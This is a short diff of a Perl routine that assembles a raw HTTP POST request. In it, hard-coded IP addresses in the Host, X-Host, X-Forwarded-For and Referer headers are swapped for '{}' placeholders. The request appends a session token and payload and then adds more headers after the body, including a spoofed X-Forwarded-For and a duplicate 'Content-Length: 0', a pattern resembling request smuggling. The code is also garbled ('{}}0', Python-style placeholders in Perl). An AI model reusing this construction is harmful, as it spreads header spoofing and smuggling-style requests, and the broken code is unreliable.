@@ -28,13 +28,13 @@ sub send_http_request {
     }
 
     my $http_request = "POST / HTTP/1.1\r\n"
-        . "Host: 52.210.85.112\r\n"
+        . "Host: {}\r\n"
         . "Content-Length: " . length($payload) . "\r\n"
         . "Content-Type: text/plain\r\n\r\n"
         . "Session=_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb950754581406246bf8" .$payload
-        . "X-Host: 10.34.90.00\r\n"
-        . "X-Forwarded-For: 10.23.56.89\r\n"
-        . "Referer: 52.210.85.112:443\r\n"
+        . "X-Host: {}}0\r\n"
+        . "X-Forwarded-For: {}\r\n"
+        . "Referer: {}\r\n"
         . "Content-Type: multipart/form-data; boundary=b2a76b357c894dca991b7e6330bb7ccc\r\n"
         . "Content-Length: 0\r\n\r\n";
 
